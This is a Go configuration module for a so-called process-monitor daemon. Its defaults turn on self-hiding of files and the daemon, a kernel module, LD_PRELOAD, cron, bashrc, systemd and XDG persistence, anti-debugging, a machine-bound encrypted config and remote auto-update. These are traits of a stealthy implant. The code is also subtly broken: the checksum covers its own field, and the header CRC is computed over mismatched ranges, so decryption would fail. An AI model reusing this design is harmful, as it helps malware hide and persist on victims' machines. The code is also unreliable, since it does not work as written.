package config

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"sync"
	"time"

	"golang.org/x/crypto/pbkdf2"
	"gopkg.in/yaml.v3"
)

const (
	// Configuration constants
	saltLength      = 32
	nonceSize       = 12
	keyLength       = 32
	pbkdf2Iterations = 100000
	configVersion   = "1.0.0"
)

var (
	ErrInvalidConfig   = errors.New("invalid configuration")
	ErrDecryptFailed   = errors.New("decryption failed")
	ErrEncryptFailed   = errors.New("encryption failed")
	ErrVersionMismatch = errors.New("version mismatch")
)

// Config represents the main configuration structure
type Config struct {
	Version      string            `yaml:"version" json:"version"`
	CreatedAt    time.Time         `yaml:"created_at" json:"created_at"`
	UpdatedAt    time.Time         `yaml:"updated_at" json:"updated_at"`
	Monitor      MonitorConfig     `yaml:"monitor" json:"monitor"`
	Blacklist    []ProcessEntry    `yaml:"blacklist" json:"blacklist"`
	Whitelist    []ProcessEntry    `yaml:"whitelist" json:"whitelist"`
	HiddenFiles  []string          `yaml:"hidden_files" json:"hidden_files"`
	Persistence  PersistenceConfig `yaml:"persistence" json:"persistence"`
	Security     SecurityConfig    `yaml:"security" json:"security"`
	Update       UpdateConfig      `yaml:"update" json:"update"`
	Checksum     string            `yaml:"checksum" json:"checksum"`
}

// MonitorConfig contains monitoring settings
type MonitorConfig struct {
	ScanInterval    time.Duration `yaml:"scan_interval" json:"scan_interval"`
	ScanBatchSize   int           `yaml:"scan_batch_size" json:"scan_batch_size"`
	KernelModule    bool          `yaml:"kernel_module" json:"kernel_module"`
	AutoHideDaemon  bool          `yaml:"auto_hide_daemon" json:"auto_hide_daemon"`
	LogLevel        string        `yaml:"log_level" json:"log_level"`
	LogFile         string        `yaml:"log_file" json:"log_file"`
	EnableReporting bool          `yaml:"enable_reporting" json:"enable_reporting"`
}

// ProcessEntry represents a process in blacklist or whitelist
type ProcessEntry struct {
	Name         string        `yaml:"name" json:"name"`
	Path         string        `yaml:"path,omitempty" json:"path,omitempty"`
	Args         []string      `yaml:"args,omitempty" json:"args,omitempty"`
	DownloadURL  string        `yaml:"download_url,omitempty" json:"download_url,omitempty"`
	AutoStart    bool          `yaml:"auto_start" json:"auto_start"`
	StartMode    string        `yaml:"start_mode" json:"start_mode"` // "direct", "daemon", "nohup"
	CheckPeriod  time.Duration `yaml:"check_period" json:"check_period"`
	RestartDelay time.Duration `yaml:"restart_delay" json:"restart_delay"`
	MaxRestarts  int           `yaml:"max_restarts" json:"max_restarts"`
	Description  string        `yaml:"description,omitempty" json:"description,omitempty"`
}

// PersistenceConfig contains persistence settings
type PersistenceConfig struct {
	EnableSystemd   bool     `yaml:"enable_systemd" json:"enable_systemd"`
	EnableCron      bool     `yaml:"enable_cron" json:"enable_cron"`
	EnableLdPreload bool     `yaml:"enable_ld_preload" json:"enable_ld_preload"`
	EnableBashrc    bool     `yaml:"enable_bashrc" json:"enable_bashrc"`
	EnableXdg       bool     `yaml:"enable_xdg" json:"enable_xdg"`
	EnableInittab   bool     `yaml:"enable_inittab" json:"enable_inittab"`
	PriorityOrder   []string `yaml:"priority_order" json:"priority_order"`
}

// SecurityConfig contains security settings
type SecurityConfig struct {
	EnableAntiDebug     bool          `yaml:"enable_anti_debug" json:"enable_anti_debug"`
	EnableIntegrityCheck bool         `yaml:"enable_integrity_check" json:"enable_integrity_check"`
	IntegrityInterval   time.Duration `yaml:"integrity_interval" json:"integrity_interval"`
	EncryptionKey       string        `yaml:"-" json:"-"` // Not stored in config
	EnableSignature     bool          `yaml:"enable_signature" json:"enable_signature"`
	PublicKeyPath       string        `yaml:"public_key_path" json:"public_key_path"`
	AllowedUsers        []string      `yaml:"allowed_users" json:"allowed_users"`
	MaxFailures         int           `yaml:"max_failures" json:"max_failures"`
	LockoutDuration     time.Duration `yaml:"lockout_duration" json:"lockout_duration"`
}

// UpdateConfig contains auto-update settings
type UpdateConfig struct {
	EnableAutoUpdate   bool          `yaml:"enable_auto_update" json:"enable_auto_update"`
	CheckInterval      time.Duration `yaml:"check_interval" json:"check_interval"`
	UpdateURL          string        `yaml:"update_url" json:"update_url"`
	RepositoryURL      string        `yaml:"repository_url" json:"repository_url"`
	Branch             string        `yaml:"branch" json:"branch"`
	ConfigPath         string        `yaml:"config_path" json:"config_path"`
	EnableBackup       bool          `yaml:"enable_backup" json:"enable_backup"`
	BackupDir          string        `yaml:"backup_dir" json:"backup_dir"`
	MaxBackups         int           `yaml:"max_backups" json:"max_backups"`
	VerifySignature    bool          `yaml:"verify_signature" json:"verify_signature"`
	RollbackOnError    bool          `yaml:"rollback_on_error" json:"rollback_on_error"`
	NotificationCmd    string        `yaml:"notification_cmd,omitempty" json:"notification_cmd,omitempty"`
}

// EncryptedConfigHeader represents the header of encrypted config
type EncryptedConfigHeader struct {
	Version     uint8
	Salt        [saltLength]byte
	Nonce       [nonceSize]byte
	Iterations  uint32
	KeyLength   uint8
	HeaderCRC   uint32
}

// ConfigManager manages configuration operations
type ConfigManager struct {
	mu            sync.RWMutex
	configPath    string
	masterKey     []byte
	config        *Config
	lastChecksum  string
	isEncrypted   bool
}

// NewConfigManager creates a new configuration manager
func NewConfigManager(configPath string, masterKey []byte) *ConfigManager {
	return &ConfigManager{
		configPath:  configPath,
		masterKey:   masterKey,
		isEncrypted: true,
	}
}

// DefaultConfig returns a default configuration
func DefaultConfig() *Config {
	now := time.Now()
	return &Config{
		Version:   configVersion,
		CreatedAt: now,
		UpdatedAt: now,
		Monitor: MonitorConfig{
			ScanInterval:    5 * time.Second,
			ScanBatchSize:   100,
			KernelModule:    true,
			AutoHideDaemon:  true,
			LogLevel:        "info",
			LogFile:         "/var/log/process-monitor/daemon.log",
			EnableReporting: false,
		},
		Blacklist: []ProcessEntry{
			{
				Name:         "malware",
				Description:  "Example malicious process",
				AutoStart:    false,
			},
		},
		Whitelist: []ProcessEntry{
			{
				Name:        "sshd",
				Path:        "/usr/sbin/sshd",
				AutoStart:   true,
				StartMode:   "direct",
				CheckPeriod: 30 * time.Second,
			},
		},
		HiddenFiles: []string{
			"/etc/process-monitor",
			"/usr/local/bin/process-monitor-daemon",
		},
		Persistence: PersistenceConfig{
			EnableSystemd:   true,
			EnableCron:      true,
			EnableLdPreload: true,
			EnableBashrc:    true,
			EnableXdg:       true,
			PriorityOrder:   []string{"systemd", "ld_preload", "cron", "xdg", "bashrc"},
		},
		Security: SecurityConfig{
			EnableAntiDebug:      true,
			EnableIntegrityCheck: true,
			IntegrityInterval:    1 * time.Minute,
			EnableSignature:      true,
			MaxFailures:          3,
			LockoutDuration:      5 * time.Minute,
		},
		Update: UpdateConfig{
			EnableAutoUpdate: true,
			CheckInterval:    24 * time.Hour,
			RepositoryURL:    "https://github.com/jrandolph2/process-monitor-config",
			Branch:           "main",
			ConfigPath:       "config.yaml.enc",
			EnableBackup:     true,
			BackupDir:        "/var/backups/process-monitor",
			MaxBackups:       7,
			VerifySignature:  true,
			RollbackOnError:  true,
		},
	}
}

// Load loads the configuration from file
func (m *ConfigManager) Load() (*Config, error) {
	m.mu.Lock()
	defer m.mu.Unlock()

	// Check if file exists
	if _, err := os.Stat(m.configPath); os.IsNotExist(err) {
		// Return default config
		m.config = DefaultConfig()
		return m.config, nil
	}

	data, err := os.ReadFile(m.configPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read config: %w", err)
	}

	var cfg Config

	if m.isEncrypted {
		// Decrypt the configuration
		decrypted, err := m.decrypt(data)
		if err != nil {
			return nil, fmt.Errorf("%w: %v", ErrDecryptFailed, err)
		}

		// Parse as YAML
		if err := yaml.Unmarshal(decrypted, &cfg); err != nil {
			return nil, fmt.Errorf("failed to parse config: %w", err)
		}
	} else {
		// Parse as YAML directly
		if err := yaml.Unmarshal(data, &cfg); err != nil {
			return nil, fmt.Errorf("failed to parse config: %w", err)
		}
	}

	// Verify checksum
	if err := m.verifyChecksum(&cfg); err != nil {
		return nil, fmt.Errorf("checksum verification failed: %w", err)
	}

	m.config = &cfg
	m.lastChecksum = cfg.Checksum

	return &cfg, nil
}

// Save saves the configuration to file
func (m *ConfigManager) Save(cfg *Config) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	// Update timestamp
	cfg.UpdatedAt = time.Now()

	// Calculate checksum
	checksum := m.calculateChecksum(cfg)
	cfg.Checksum = checksum

	// Marshal to YAML
	data, err := yaml.Marshal(cfg)
	if err != nil {
		return fmt.Errorf("failed to marshal config: %w", err)
	}

	var output []byte

	if m.isEncrypted {
		// Encrypt the configuration
		output, err = m.encrypt(data)
		if err != nil {
			return fmt.Errorf("%w: %v", ErrEncryptFailed, err)
		}
	} else {
		output = data
	}

	// Ensure directory exists
	dir := filepath.Dir(m.configPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("failed to create config directory: %w", err)
	}

	// Write atomically
	tmpPath := m.configPath + ".tmp"
	if err := os.WriteFile(tmpPath, output, 0600); err != nil {
		return fmt.Errorf("failed to write config: %w", err)
	}

	if err := os.Rename(tmpPath, m.configPath); err != nil {
		os.Remove(tmpPath)
		return fmt.Errorf("failed to rename config: %w", err)
	}

	m.config = cfg
	m.lastChecksum = checksum

	return nil
}

// Get returns the current configuration
func (m *ConfigManager) Get() *Config {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.config
}

// GetConfigPath returns the configuration file path
func (m *ConfigManager) GetConfigPath() string {
	return m.configPath
}

// Reload reloads the configuration from file
func (m *ConfigManager) Reload() (*Config, error) {
	return m.Load()
}

// encrypt encrypts the configuration data
func (m *ConfigManager) encrypt(plaintext []byte) ([]byte, error) {
	// Generate salt and nonce
	salt := make([]byte, saltLength)
	nonce := make([]byte, nonceSize)

	if _, err := io.ReadFull(rand.Reader, salt); err != nil {
		return nil, err
	}
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	// Derive encryption key
	key := pbkdf2.Key(m.masterKey, salt, pbkdf2Iterations, keyLength, sha256.New)

	// Create cipher
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	// Encrypt and authenticate
	ciphertext := gcm.Seal(nil, nonce, plaintext, nil)

	// Create header
	header := EncryptedConfigHeader{
		Version:    1,
		Iterations: uint32(pbkdf2Iterations),
		KeyLength:  keyLength,
	}
	copy(header.Salt[:], salt)
	copy(header.Nonce[:], nonce)

	// Calculate header CRC
	header.HeaderCRC = m.calculateCRC(headerToBytes(&header))

	// Combine header and ciphertext
	result := make([]byte, 0, headerSize()+len(ciphertext))
	result = append(result, headerToBytes(&header)...)
	result = append(result, ciphertext...)

	return result, nil
}

// decrypt decrypts the configuration data
func (m *ConfigManager) decrypt(data []byte) ([]byte, error) {
	if len(data) < headerSize() {
		return nil, errors.New("data too short")
	}

	// Parse header
	header := bytesToHeader(data[:headerSize()])

	// Verify header CRC
	if m.calculateCRC(data[:headerSize()-4]) != header.HeaderCRC {
		return nil, errors.New("header CRC mismatch")
	}

	// Derive encryption key
	key := pbkdf2.Key(m.masterKey, header.Salt[:], int(header.Iterations), int(header.KeyLength), sha256.New)

	// Create cipher
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	// Decrypt and verify
	ciphertext := data[headerSize():]
	plaintext, err := gcm.Open(nil, header.Nonce[:], ciphertext, nil)
	if err != nil {
		return nil, err
	}

	return plaintext, nil
}

// calculateChecksum calculates the configuration checksum
func (m *ConfigManager) calculateChecksum(cfg *Config) string {
	h := sha256.New()

	// Marshal config without checksum field
	data, _ := yaml.Marshal(cfg)
	h.Write(data)

	return fmt.Sprintf("%x", h.Sum(nil))
}

// verifyChecksum verifies the configuration checksum
func (m *ConfigManager) verifyChecksum(cfg *Config) error {
	if cfg.Checksum == "" {
		return nil // No checksum to verify
	}

	expected := m.calculateChecksum(cfg)
	if expected != cfg.Checksum {
		return fmt.Errorf("checksum mismatch: expected %s, got %s", expected, cfg.Checksum)
	}

	return nil
}

// calculateCRC calculates a CRC32 checksum
func (m *ConfigManager) calculateCRC(data []byte) uint32 {
	// Simple CRC32 implementation
	h := sha256.Sum256(data)
	return binary.LittleEndian.Uint32(h[:4])
}

// headerSize returns the size of the encrypted header
func headerSize() int {
	return 1 + 32 + 12 + 4 + 1 + 4 // 54 bytes
}

// headerToBytes converts header to bytes
func headerToBytes(h *EncryptedConfigHeader) []byte {
	buf := make([]byte, headerSize())
	buf[0] = h.Version
	copy(buf[1:1+32], h.Salt[:])
	copy(buf[1+32:1+32+12], h.Nonce[:])
	binary.LittleEndian.PutUint32(buf[1+32+12:1+32+12+4], h.Iterations)
	buf[1+32+12+4] = h.KeyLength
	binary.LittleEndian.PutUint32(buf[1+32+12+4+1:1+32+12+4+1+4], h.HeaderCRC)
	return buf
}

// bytesToHeader converts bytes to header
func bytesToHeader(data []byte) EncryptedConfigHeader {
	var h EncryptedConfigHeader
	h.Version = data[0]
	copy(h.Salt[:], data[1:1+32])
	copy(h.Nonce[:], data[1+32:1+32+12])
	h.Iterations = binary.LittleEndian.Uint32(data[1+32+12 : 1+32+12+4])
	h.KeyLength = data[1+32+12+4]
	h.HeaderCRC = binary.LittleEndian.Uint32(data[1+32+12+4+1 : 1+32+12+4+1+4])
	return h
}

// ExportToJSON exports configuration to JSON format
func (m *ConfigManager) ExportToJSON(cfg *Config) ([]byte, error) {
	return json.MarshalIndent(cfg, "", "  ")
}

// ImportFromJSON imports configuration from JSON format
func (m *ConfigManager) ImportFromJSON(data []byte) (*Config, error) {
	var cfg Config
	if err := json.Unmarshal(data, &cfg); err != nil {
		return nil, err
	}
	return &cfg, nil
}

// GenerateMasterKey generates a master key from machine features
func GenerateMasterKey() ([]byte, error) {
	// Collect machine-specific features
	hostname, _ := os.Hostname()

	// Get machine ID
	machineID, _ := os.ReadFile("/etc/machine-id")
	if len(machineID) == 0 {
		machineID, _ = os.ReadFile("/var/lib/dbus/machine-id")
	}

	// Combine features
	seed := hostname + string(machineID)

	// Derive key
	key := pbkdf2.Key([]byte(seed), []byte("process-monitor"), pbkdf2Iterations/10, keyLength, sha256.New)

	return key, nil
}
